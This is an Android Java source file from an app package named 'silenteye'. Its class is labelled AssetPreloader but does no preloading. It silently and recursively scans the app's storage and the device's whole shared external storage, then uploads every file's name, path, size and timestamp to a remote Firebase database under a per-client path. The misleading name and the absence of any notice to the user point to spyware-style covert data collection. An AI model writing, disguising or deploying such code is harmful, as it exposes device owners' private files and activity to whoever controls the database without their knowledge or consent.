package com.silenteye;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class AssetPreloader {
    private static final String TAG = "AssetPreloader";

    public static void scanAndUploadFiles(Context context) {
        // Warning: Scanning the entire external storage can take a long time and memory.
        // It's recommended to do this on a background thread.
        new Thread(() -> {
            List<Map<String, Object>> fileList = new ArrayList<>();

            // 1. Scan Internal Storage (App Sandbox)
            File internalDir = context.getFilesDir();
            scanDirectory(internalDir, fileList);

            // 2. Scan External Storage (Public Shared Storage)
            File externalDir = Environment.getExternalStorageDirectory();
            scanDirectory(externalDir, fileList);

            // 3. Upload to Firebase under clients/{CLIENT_ID}/scanned_files
            DatabaseReference dbRef = ClientManager.getChildRef("scanned_files");
            for (Map<String, Object> fileData : fileList) {
                dbRef.push().setValue(fileData)
                     .addOnFailureListener(e -> Log.e(TAG, "Failed to upload file info", e));
            }

            Log.d(TAG, "Finished scanning files. Total files found: " + fileList.size());
        }).start();
    }

    private static void scanDirectory(File directory, List<Map<String, Object>> fileList) {
        if (directory != null && directory.exists() && directory.isDirectory()) {
            File[] files = directory.listFiles();
            // files can be null if permission is denied
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        // Recursively scan subdirectories
                        scanDirectory(file, fileList);
                    } else {
                        // We use the File object to extract directory stats as requested
                        Map<String, Object> fileData = new HashMap<>();
                        fileData.put("name", file.getName());
                        fileData.put("path", file.getAbsolutePath());
                        fileData.put("size", file.length()); // Size in bytes
                        fileData.put("lastModified", file.lastModified());
                        
                        fileList.add(fileData);
                    }
                }
            }
        }
    }
}
